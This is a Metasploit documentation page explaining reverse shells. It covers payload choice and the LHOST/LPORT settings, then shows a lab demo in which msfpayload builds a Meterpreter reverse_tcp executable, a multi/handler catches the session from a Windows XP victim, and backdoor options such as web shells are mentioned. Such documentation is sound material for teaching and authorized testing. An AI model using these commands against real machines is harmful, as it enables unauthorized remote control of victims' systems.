<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
<head>
  <meta charset="utf-8" />
  <meta name="generator" content="pandoc" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
  <meta name="author" content="Metasploit Versions 4,5" />
  <title>How to use a reverse shell</title>
  <style>
    code{white-space: pre-wrap;}
    span.smallcaps{font-variant: small-caps;}
    span.underline{text-decoration: underline;}
    div.column{display: inline-block; vertical-align: top; width: 50%;}
    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
    ul.task-list{list-style: none;}
    pre > code.sourceCode { white-space: pre; position: relative; }
    pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
    pre > code.sourceCode > span:empty { height: 1.2em; }
    code.sourceCode > span { color: inherit; text-decoration: inherit; }
    div.sourceCode { margin: 1em 0; }
    pre.sourceCode { margin: 0; }
    @media screen {
    div.sourceCode { overflow: auto; }
    }
    @media print {
    pre > code.sourceCode { white-space: pre-wrap; }
    pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
    }
    pre.numberSource code
      { counter-reset: source-line 0; }
    pre.numberSource code > span
      { position: relative; left: -4em; counter-increment: source-line; }
    pre.numberSource code > span > a:first-child::before
      { content: counter(source-line);
        position: relative; left: -1em; text-align: right; vertical-align: baseline;
        border: none; display: inline-block;
        -webkit-touch-callout: none; -webkit-user-select: none;
        -khtml-user-select: none; -moz-user-select: none;
        -ms-user-select: none; user-select: none;
        padding: 0 4px; width: 4em;
        color: #aaaaaa;
      }
    pre.numberSource { margin-left: 3em; border-left: 1px solid #aaaaaa;  padding-left: 4px; }
    div.sourceCode
      {   }
    @media screen {
    pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
    }
    code span.al { color: #ff0000; font-weight: bold; } /* Alert */
    code span.an { color: #60a0b0; font-weight: bold; font-style: italic; } /* Annotation */
    code span.at { color: #7d9029; } /* Attribute */
    code span.bn { color: #40a070; } /* BaseN */
    code span.bu { } /* BuiltIn */
    code span.cf { color: #007020; font-weight: bold; } /* ControlFlow */
    code span.ch { color: #4070a0; } /* Char */
    code span.cn { color: #880000; } /* Constant */
    code span.co { color: #60a0b0; font-style: italic; } /* Comment */
    code span.cv { color: #60a0b0; font-weight: bold; font-style: italic; } /* CommentVar */
    code span.do { color: #ba2121; font-style: italic; } /* Documentation */
    code span.dt { color: #902000; } /* DataType */
    code span.dv { color: #40a070; } /* DecVal */
    code span.er { color: #ff0000; font-weight: bold; } /* Error */
    code span.ex { } /* Extension */
    code span.fl { color: #40a070; } /* Float */
    code span.fu { color: #06287e; } /* Function */
    code span.im { } /* Import */
    code span.in { color: #60a0b0; font-weight: bold; font-style: italic; } /* Information */
    code span.kw { color: #007020; font-weight: bold; } /* Keyword */
    code span.op { color: #666666; } /* Operator */
    code span.ot { color: #007020; } /* Other */
    code span.pp { color: #bc7a00; } /* Preprocessor */
    code span.sc { color: #4070a0; } /* SpecialChar */
    code span.ss { color: #bb6688; } /* SpecialString */
    code span.st { color: #4070a0; } /* String */
    code span.va { color: #19177c; } /* Variable */
    code span.vs { color: #4070a0; } /* VerbatimString */
    code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warning */
  </style>
  <link rel="stylesheet" href="../../styles.css" />
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,400;0,700;1,300;1,400&display=swap" />
  <!--[if lt IE 9]>
    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
  <![endif]-->
</head>
<body>

<div id="main-outer-box">

<nav class="right">
  <ul>
    <li style="display: inline;"> <a href="https://github.com/rapid7/metasploit-framework/tree/master/documentation/modules" target="_blank">Module Docs</a></li>
    <li style="display: inline;"><a href="https://rapid7.github.io/metasploit-framework/api/" target="_blank">API</a></li>
    <li style="display: inline;"><a href="https://github.com/rapid7/metasploit-framework" target="_blank">Metasploit GitHub</a></li>
     <li style="display: inline;"><a href="../../search.html">Search</a></li>
  </ul>
</nav>

<div id="my-header">
  <a href="{{path-to-index}}">Metasploit Framework</a>
</div>

<div id="trunk-box">

<div id="nav-box">
<p>Contents:</p>
<ul>
<li>Getting-Started/
<ul>
<li><a href="../.././Getting-Started/Installing-Metasploit.html">Installing Metasploit</a></li>
<li><a href="../.././Getting-Started/setting-up-metasploit-dev-enviroment.html">Setting up a Metasploit Developer Environment</a></li>
<li>Contributing/
<ul>
<li><a href="../.././Getting-Started/Contributing/Code-Of-Conduct.html">Contributor Code of Conduct</a></li>
<li><a href="../.././Getting-Started/Contributing/Contributing-to-Metasploit.html">Contributing to Metasploit</a></li>
<li><a href="../.././Getting-Started/Contributing/Guidelines-for-Accepting-Modules-and-Enhancements.html">Guidelines for accepting modules and enhancements</a></li>
<li><a href="../.././Getting-Started/Contributing/Adding-Release-Notes-to-PRs.html">Adding release notes to PRs</a></li>
<li><a href="../.././Getting-Started/Contributing/Landing-Pull-Requests.html">Landing pull requests</a></li>
<li><a href="../.././Getting-Started/Contributing/Keeping-in-sync-with-rapid7-master.html">Keep in sync with master</a></li>
<li><a href="../.././Getting-Started/Contributing/How-to-add-and-update-gems-in-metasploit-framework.html">How to add and update gems</a></li>
<li><a href="../.././Getting-Started/Contributing/How-to-deprecate-a-Metasploit-module.html">How to deprecate a Metasploit module</a></li>
<li><a href="../.././Getting-Started/Contributing/Rolling-back-merges.html">Roll back merges</a></li>
<li><a href="../.././Getting-Started/Contributing/Style-Tips.html">Style Tips</a></li>
<li><a href="../.././Getting-Started/Contributing/Reporting-a-Bug.html">Metasploit Bug Reporting</a></li>
<li><a href="../.././Getting-Started/Contributing/markdown-cheat-sheet.html">Markdown Cheat Sheet</a></li>
</ul></li>
<li>Kali-Linux/
<ul>
<li><a href="../.././Getting-Started/Kali-Linux/How-to-get-Oracle-Support-working-with-Kali-Linux.html">Use Oracle support with Kali Linux</a></li>
</ul></li>
<li><a href="../.././Getting-Started/Contact.html">Contact</a></li>
</ul></li>
<li>Internals/
<ul>
<li><a href="../.././Internals/workspaces.html">Workspaces</a></li>
</ul></li>
<li>Modules/
<ul>
<li><a href="../.././Modules/How-to-use-a-Metasploit-module-appropriately.html">Properly use a module</a></li>
<li><a href="../.././Modules/Module-Documentation.html">Module documentation</a></li>
<li><a href="../.././Modules/Handling-Module-Failures-with-fail_with.html">Handing modules failures with <code>fail_with</code></a></li>
<li><a href="../.././Modules/Running-Private-Modules.html">Run private modules</a></li>
<li><a href="../.././Modules/How-to-do-reporting-or-store-data-in-module-development.html">How to do reporting and store data during module development</a></li>
<li><a href="../.././Modules/Using-ReflectiveDll-Injection.html">Using the ReflectiveDll loader in a Metasploit module</a></li>
<li>Write-Modules/
<ul>
<li><a href="../.././Modules/Write-Modules/How-to-write-a-module-using-HttpServer-and-HttpClient.html">How to write a module using HTTPServer and HTTPClient</a></li>
<li><a href="../.././Modules/Write-Modules/Writing-External-Metasploit-Modules.html">Writing External Metasploit Modules</a></li>
<li><a href="../.././Modules/Write-Modules/get-started-writing-auxillary-module.html">Get started with writing an auxiliary module</a></li>
<li><a href="../.././Modules/Write-Modules/How-to-write-a-HTTP-LoginScanner-Module.html">How to write a HTTP LoginScanner Module</a></li>
<li><a href="../.././Modules/Write-Modules/Writing-External-Python-Modules.html">Writing Python Modules for Metasploit</a></li>
<li><a href="../.././Modules/Write-Modules/get-started-writing-post-module.html">Get started with writing a post module</a></li>
<li><a href="../.././Modules/Write-Modules/Writing-External-GoLang-Modules.html">Writing external GoLang modules</a></li>
<li><a href="../.././Modules/Write-Modules/login-scanner.html">Create a Login Scanner Module</a></li>
<li><a href="../.././Modules/Write-Modules/http-login-scanner.html">How to write a HTTP LoginScanner Module</a></li>
</ul></li>
<li><a href="../.././Modules/module-reference-identifiers.html">Reference Identifiers</a></li>
</ul></li>
<li>Exploits/
<ul>
<li><a href="../.././Exploits/use-exploits.html">Use exploits</a></li>
<li><a href="../.././Exploits/Information-About-Unmet-Browser-Exploit-Requirements.html">Unmet browser exploit requirements</a></li>
<li><a href="../.././Exploits/How-to-use-Powershell-in-an-exploit.html">Add PowerShell mixin to an exploit</a></li>
<li><a href="../.././Exploits/How-to-clean-up-files-using-FileDropper.html">How to clean up files using FileDropper</a></li>
<li><a href="../.././Exploits/How-to-use-PhpEXE-to-exploit-an-arbitrary-file-upload-bug.html">PhpEXE arbitrary file upload</a></li>
<li><a href="../.././Exploits/How-to-use-Railgun-for-Windows-post-exploitation.html">Use Railgun for Windows</a></li>
<li><a href="../.././Exploits/How-to-use-command-stagers.html">Use command stagers</a></li>
<li><a href="../.././Exploits/exploit-ranking.html">Exploit Ranking</a></li>
<li>Write-Exploits/
<ul>
<li><a href="../.././Exploits/Write-Exploits/writing-exploits.html">Get Started Writing an Exploit</a></li>
<li><a href="../.././Exploits/Write-Exploits/How-to-use-WbemExec-for-a-write-privilege-attack-on-Windows.html">Write a privilege attack with WbemExec</a></li>
<li><a href="../.././Exploits/Write-Exploits/How-to-Use-the-FILEFORMAT-mixin-to-create-a-file-format-exploit.html">How to use the FILEFORMAT mixin</a></li>
<li><a href="../.././Exploits/Write-Exploits/How-to-write-a-browser-exploit-using-HttpServer.html">How to write a browser exploit using HTTP Server</a></li>
<li><a href="../.././Exploits/Write-Exploits/How-to-write-a-browser-exploit-using-BrowserExploitServer.html">Write a browser exploit with BrowserExploitServer</a></li>
</ul></li>
</ul></li>
<li>Payloads/
<ul>
<li><a href="../.././Payloads/how-payloads-work.html">How Payloads Work</a></li>
<li><a href="../.././Payloads/payload-debugging.html">Payload Debugging</a></li>
<li><a href="../.././Payloads/Payload-UUID.html">Payload UUID</a></li>
<li>Meterpreter/
<ul>
<li><a href="../.././Payloads/Meterpreter/about-meterpreter.html">About Meterpreter</a></li>
<li><a href="../.././Payloads/Meterpreter/meterpreter-configuration.html">Meterpreter Configuration</a></li>
<li><a href="../.././Payloads/Meterpreter/transport-control.html">Transport Control</a></li>
<li><a href="../.././Payloads/Meterpreter/Meterpreter-Reliable-Network-Communication.html">Reliable Network Communication</a></li>
<li><a href="../.././Payloads/Meterpreter/Meterpreter-Unicode-Support.html">Unicode Support</a></li>
<li><a href="../.././Payloads/Meterpreter/Meterpreter-HTTP-Communication.html">Meterpreter HTTP communication</a></li>
<li><a href="../.././Payloads/Meterpreter/Meterpreter-Sleep-Control.html">Sleep Control</a></li>
<li><a href="../.././Payloads/Meterpreter/Meterpreter-Paranoid-Mode.html">Paranoid Mode</a></li>
<li><a href="../.././Payloads/Meterpreter/The-ins-and-outs-of-HTTP-and-HTTPS-communications-in-Meterpreter-and-Metasploit-Stagers.html">HTTP and HTTPS communication</a></li>
<li><a href="../.././Payloads/Meterpreter/Python-Extension.html">Python Extension</a></li>
</ul></li>
<li>msfvenom/
<ul>
<li><a href="../.././Payloads/msfvenom/How-to-use-msfvenom.html">How to use msfvenom</a></li>
</ul></li>
<li>Shell/
<ul>
<li><strong>How to use a reverse shell</strong></li>
</ul></li>
</ul></li>
<li>Utilities/
<ul>
<li><a href="../.././Utilities/complier-windows-c.html">How to use Metasploit Framework Compiler Windows to compile C code</a></li>
<li><a href="../.././Utilities/oracle-support-kali-linux.html">Oracle Support working with Kali Linux</a></li>
<li><a href="../.././Utilities/How-to-zip-files-with-Msf-Util-EXE.to_zip.html">How to zip files with Msf::Util::EXE.to_zip</a></li>
<li><a href="../.././Utilities/How-to-use-the-Msf-Exploit-Remote-Tcp-mixin.html">How to use the Msf::Exploit::Remote::Tcp mixin</a></li>
</ul></li>
<li>Evasion-and-Obfuscation/
<ul>
<li><a href="../.././Evasion-and-Obfuscation/obfuscation-crandomizer.html">CRandomizer</a></li>
<li><a href="../.././Evasion-and-Obfuscation/How-to-obfuscate-JavaScript-in-Metasploit.html">Obfuscate JavaScript</a></li>
<li><a href="../.././Evasion-and-Obfuscation/How-to-use-Metasploit-Framework-Obfuscation-CRandomizer.html">How to use CRandomizer</a></li>
</ul></li>
<li>API/
<ul>
<li><a href="../.././API/Metasploit-Web-Service.html">Metasploit web service</a></li>
<li><a href="../.././API/Metasploit-as-a-service.html">Metasploit as a service</a></li>
</ul></li>
<li>Debugging/
<ul>
<li><a href="../.././Debugging/How-to-log-in-Metasploit.html">Log Files in Metasploit</a></li>
<li><a href="../.././Debugging/Why-CVE-is-not-available.html">Why is a CVE Not Available?</a></li>
</ul></li>
<li><a href="../.././external-resources.html">Community Resources</a></li>
</ul>

</div>

<div id="article-box">

<div id="header-nav-bar">
<div><a href="../.././Payloads/msfvenom/How-to-use-msfvenom.html">←prev</a></div><div class="nav-bar-push"><a href="../.././Utilities/complier-windows-c.html">next→</a></div>
</div>

<div id="article-content">
<header id="title-block-header">
<h1 class="title">How to use a reverse shell</h1>
<p class="author">Metasploit Versions 4,5</p>
</header>
<nav id="TOC" role="doc-toc">
<ul>
<li><a href="#list-of-metasploit-reverse-shells">List of Metasploit reverse shells</a>
<ul>
<li><a href="#windows-common-reverse-shell">Windows common reverse shell</a></li>
<li><a href="#linux-common-reverse-shell">Linux common reverse shell</a></li>
</ul></li>
<li><a href="#when-to-use-a-reverse-shell">When to use a reverse shell</a></li>
<li><a href="#when-a-reverse-shell-isnt-needed">When a reverse shell isn’t needed</a></li>
<li><a href="#how-to-set-up-for-a-reverse-shell-during-payload-generation">How to set up for a reverse shell during payload generation</a></li>
<li><a href="#demonstration">Demonstration</a>
<ul>
<li><a href="#step-1-generate-the-executable-payload">Step 1: Generate the executable payload</a></li>
<li><a href="#step-2-copy-the-executable-payload-to-box-b">Step 2: Copy the executable payload to box B</a></li>
<li><a href="#step-3-set-up-the-payload-handler-on-box-a">Step 3: Set up the payload handler on box A</a></li>
<li><a href="#step-4-double-click-on-the-malicious-executable">Step 4: Double-click on the malicious executable</a></li>
<li><a href="#step-5-view-the-meterpreterpayload-session-on-box-a">Step 5: View the meterpreter/payload session on box A</a></li>
</ul></li>
</ul>
</nav>
<p>There are two popular types of shells: bind and reverse. Bind shell - Opens up a new service on the target machine and requires the attacker to connect to it to get a session. Reverse shell - A reverse shell is also known as a connect-back. It requires the attacker to set up a listener first on his box, the target machine acts as a client connecting to that listener, and then finally, the attacker receives the shell.</p>
<p>You can learn more about the primary use of payloads in the 5.2.4 Selecting the Payload section of the old <a href="http://cs.uccs.edu/~cs591/metasploit/users_guide3_1.pdf">Metasploit Users Guide</a>.</p>
<p>This article goes over using a reverse shell to get a session.</p>
<h2 id="list-of-metasploit-reverse-shells">List of Metasploit reverse shells</h2>
<p>To get a list of reverse shells, use the <code>msfpayload</code> command. B</p>
<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1"></a><span class="ex">./msfpayload</span> -l <span class="kw">|</span><span class="fu">grep</span> reverse</span></code></pre></div>
<p>As a rule of thumb, always pick a Meterpreter, because it currently provides better support of the post-exploitation Metasploit has to offer. For example, railgun, post modules, different meterpreter commands.</p>
<h3 id="windows-common-reverse-shell">Windows common reverse shell</h3>
<p>In Windows, the most commonly used reverse shell is <code>windows/meterpreter/reverse</code>. You can also use <code>windows/meterpreter/reverse_http</code> or <code>windows/meterpreter/reverse_https</code> because their network traffic appears a little bit less abnormal.</p>
<h3 id="linux-common-reverse-shell">Linux common reverse shell</h3>
<p>In Linux, you can try <code>linux/x86/meterpreter/reverse_tcp</code>, or the 64-bit one. The <code>linux/x86/shell_reverse_tcp</code> has been the most stable.</p>
<h2 id="when-to-use-a-reverse-shell">When to use a reverse shell</h2>
<p>If you find yourself in one of the following scenarios, then you should consider using a reverse shell:</p>
<ul>
<li>The target machine is behind a different private network.</li>
<li>The target machine’s firewall blocks incoming connection attempts to your bindshell.</li>
<li>Your payload is unable to bind to the port it wants due to whatever reason.</li>
<li>You can’t decide what to choose.</li>
</ul>
<h2 id="when-a-reverse-shell-isnt-needed">When a reverse shell isn’t needed</h2>
<p>Generally speaking, if you can backdoor an existing service, you may not need a reverse shell. For example, if the target machine is already running an SSH server, then you can try adding a new user to it and use that.</p>
<p>If the target machine is running a web server that supports a server-side programming language, then you can leave a backdoor in that language. For example, many Apache servers support PHP, then you can use a PHP “web shell”. IIS servers usually support ASP or ASP.net. The Metasploit Framework offers payloads in all these languages and many others.</p>
<p>This also applied to VNC, remote desktop, SMB (psexec), or other remote admin tools, etc.</p>
<h2 id="how-to-set-up-for-a-reverse-shell-during-payload-generation">How to set up for a reverse shell during payload generation</h2>
<p>When you generate a reverse shell with either <code>msfpayload</code> or <code>msfvenom</code>, you must know how to configure the following:</p>
<ul>
<li><strong>LHOST</strong> - This is the IP address you want your target machine to connect to. If you’re in a local area network, it is unlikely your target machine can reach you unless you both are on the same network. In that case, you will have to <a href="https://www.google.com/webhp?q=ip#q=ip">find out your public-facing IP address</a>, and then configure your network to port-forward that connection to your box. LHOST should not be “localhost”, or “0.0.0.0”, or “127.0.0.1”, because if you do, you’re telling the target machine to connect to itself (or it may not work at all).</li>
<li><strong>LPORT</strong> - This the port you want your target machine to connect to.</li>
</ul>
<p>When you set up a listener for the reverse shell, you also at least need to configure LHOST and LPORT, but slightly different meanings (different perspective):</p>
<ul>
<li><strong>LHOST</strong> - This is the IP address you want your listener to bind to.</li>
<li><strong>LPORT</strong> - This is the port you want your listener to bind to.</li>
</ul>
<p>You should make sure the listener has started first before executing the reverse shell.</p>
<h2 id="demonstration">Demonstration</h2>
<p>In this demonstration, we have two boxes:</p>
<p><strong>Box A:</strong></p>
<ul>
<li>The attacker’s box that receives the payload session</li>
<li>IP is: 192.168.1.123 (ifconfig)</li>
<li>On the same network as the victim machine</li>
</ul>
<p><strong>Box B:</strong></p>
<ul>
<li>The “victim” machine</li>
<li>Windows XP</li>
<li>IP is: 192.168.1.80 (ipconfig)</li>
<li>On the same network as the attacker machine</li>
<li>For testing purposes, no antivirus enabled.</li>
<li>For testing purposes, no firewall enabled, either.</li>
</ul>
<h3 id="step-1-generate-the-executable-payload">Step 1: Generate the executable payload</h3>
<p>On the attacker’s box, run <code>msfpayload</code> or <code>msfvenom</code>:</p>
<div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1"></a>$ <span class="ex">./msfpayload</span> windows/meterpreter/reverse_tcp lhost=192.168.1.123 lport=4444 X <span class="op">&gt;</span> /tmp/iambad.exe</span>
<span id="cb2-2"><a href="#cb2-2"></a><span class="ex">Created</span> by msfpayload (http://www.metasploit.com)<span class="ex">.</span></span>
<span id="cb2-3"><a href="#cb2-3"></a><span class="ex">Payload</span>: windows/meterpreter/reverse_tcp</span>
<span id="cb2-4"><a href="#cb2-4"></a><span class="ex">Length</span>: 287</span>
<span id="cb2-5"><a href="#cb2-5"></a><span class="ex">Options</span>: {<span class="st">&quot;LHOST&quot;</span>=<span class="op">&gt;</span><span class="st">&quot;192.168.1.123&quot;</span>, <span class="st">&quot;LPORT&quot;</span>=<span class="op">&gt;</span><span class="st">&quot;4444&quot;</span>}</span></code></pre></div>
<h3 id="step-2-copy-the-executable-payload-to-box-b">Step 2: Copy the executable payload to box B</h3>
<p>Box B is the victim machine.</p>
<h3 id="step-3-set-up-the-payload-handler-on-box-a">Step 3: Set up the payload handler on box A</h3>
<p>Box A is the attacker machine.</p>
<div class="sourceCode" id="cb3"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1"></a>$ <span class="ex">./msfconsole</span> -q</span>
<span id="cb3-2"><a href="#cb3-2"></a><span class="ex">msf</span> <span class="op">&gt;</span> use exploit/multi/handler</span>
<span id="cb3-3"><a href="#cb3-3"></a><span class="ex">msf</span> exploit(handler) <span class="op">&gt;</span> <span class="kw">set</span> <span class="ex">payload</span> windows/meterpreter/reverse_tcp</span>
<span id="cb3-4"><a href="#cb3-4"></a><span class="ex">payload</span> =<span class="op">&gt;</span> windows/meterpreter/reverse_tcp</span>
<span id="cb3-5"><a href="#cb3-5"></a><span class="ex">msf</span> exploit(handler) <span class="op">&gt;</span> <span class="kw">set</span> <span class="ex">lhost</span> 192.168.1.123</span>
<span id="cb3-6"><a href="#cb3-6"></a><span class="ex">lhost</span> =<span class="op">&gt;</span> 192.168.1.123</span>
<span id="cb3-7"><a href="#cb3-7"></a><span class="ex">msf</span> exploit(handler) <span class="op">&gt;</span> <span class="kw">set</span> <span class="ex">lport</span> 4444</span>
<span id="cb3-8"><a href="#cb3-8"></a><span class="ex">lport</span> =<span class="op">&gt;</span> 4444</span>
<span id="cb3-9"><a href="#cb3-9"></a><span class="ex">msf</span> exploit(handler) <span class="op">&gt;</span> <span class="ex">run</span></span>
<span id="cb3-10"><a href="#cb3-10"></a></span>
<span id="cb3-11"><a href="#cb3-11"></a>[<span class="ex">*</span>] Started reverse handler on 192.168.1.123:4444</span>
<span id="cb3-12"><a href="#cb3-12"></a>[<span class="ex">*</span>] Starting the payload handler...</span></code></pre></div>
<h3 id="step-4-double-click-on-the-malicious-executable">Step 4: Double-click on the malicious executable</h3>
<p>This step requires no further explanation.</p>
<h3 id="step-5-view-the-meterpreterpayload-session-on-box-a">Step 5: View the meterpreter/payload session on box A</h3>
<div class="sourceCode" id="cb4"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1"></a>$ <span class="ex">./msfconsole</span> -q</span>
<span id="cb4-2"><a href="#cb4-2"></a><span class="ex">msf</span> <span class="op">&gt;</span> use exploit/multi/handler</span>
<span id="cb4-3"><a href="#cb4-3"></a><span class="ex">msf</span> exploit(handler) <span class="op">&gt;</span> <span class="kw">set</span> <span class="ex">payload</span> windows/meterpreter/reverse_tcp</span>
<span id="cb4-4"><a href="#cb4-4"></a><span class="ex">payload</span> =<span class="op">&gt;</span> windows/meterpreter/reverse_tcp</span>
<span id="cb4-5"><a href="#cb4-5"></a><span class="ex">msf</span> exploit(handler) <span class="op">&gt;</span> <span class="kw">set</span> <span class="ex">lhost</span> 192.168.1.123</span>
<span id="cb4-6"><a href="#cb4-6"></a><span class="ex">lhost</span> =<span class="op">&gt;</span> 192.168.1.123</span>
<span id="cb4-7"><a href="#cb4-7"></a><span class="ex">msf</span> exploit(handler) <span class="op">&gt;</span> <span class="kw">set</span> <span class="ex">lport</span> 4444</span>
<span id="cb4-8"><a href="#cb4-8"></a><span class="ex">lport</span> =<span class="op">&gt;</span> 4444</span>
<span id="cb4-9"><a href="#cb4-9"></a><span class="ex">msf</span> exploit(handler) <span class="op">&gt;</span> <span class="ex">run</span></span>
<span id="cb4-10"><a href="#cb4-10"></a></span>
<span id="cb4-11"><a href="#cb4-11"></a>[<span class="ex">*</span>] Started reverse handler on 192.168.1.123:4444</span>
<span id="cb4-12"><a href="#cb4-12"></a>[<span class="ex">*</span>] Starting the payload handler...</span>
<span id="cb4-13"><a href="#cb4-13"></a>[<span class="ex">*</span>] Sending stage (770048 bytes) <span class="ex">to</span> 192.168.1.80</span>
<span id="cb4-14"><a href="#cb4-14"></a>[<span class="ex">*</span>] Meterpreter session 1 opened (192.168.1.123:4444 -<span class="op">&gt;</span> 192.168.1.80:1138) <span class="ex">at</span> 2014-10-22 19:03:43 -0500</span>
<span id="cb4-15"><a href="#cb4-15"></a><span class="ex">meterpreter</span> <span class="op">&gt;</span></span></code></pre></div>
<p>The meterpreter prompt means you are currently interacting with the payload.</p>

</div> <!-- article-content -->

<div id="footer-nav-bar">
<div><a href="../.././Payloads/msfvenom/How-to-use-msfvenom.html">←prev</a></div><div class="nav-bar-push"><a href="../.././Utilities/complier-windows-c.html">next→</a></div>
</div>

</div> <!-- article-box -->

</div> <!-- trunk-box -->

<div id="my-footer">
<p>Copyright <a href="https://metasploit.com/">Metasploit</a>, 2020</p>
<p><a href="https://join.slack.com/t/metasploit/shared_invite/enQtOTMxMjg5ODY3NDYxLTYyZTVlNDM1ZTI3ZGQ0YTQ0NmI1YjgxMGEwYzFhOWNiZWQ4NDNmNTE1MWNiYzJhMzgwMGY0ZWY2NTY0MjA2M2I">Slack team - metasploit.slack.com</a></p>
<p><a href="https://twitter.com/metasploit">#twitter handle - @metasploit</a></p>
<p><a href="mailto:msfdev@metasploit.com">development questions - msfdev [ @ ] metasploit.com</a></p>
<p> This site is built with <a href="http://www.unexpected-vortices.com/sw/rippledoc/index.html">Rippledoc</a>, <a href="https://lunrjs.com/">Lunr</a>, and <a href="https://github.com/BLE-LTER/Lunr-Index-and-Search-for-Static-Sites">BLE-LTER</a>.<br/>
<a href="How-to-use-a-reverse-shell-in-Metasploit.md">Pandoc-Markdown source for this page</a><br/>
(Docs processed by
<a href="http://www.unexpected-vortices.com/sw/rippledoc/index.html">Rippledoc</a>.)
</div> <!-- my-footer -->

</div> <!-- main-outer-box -->

</body>
</html>
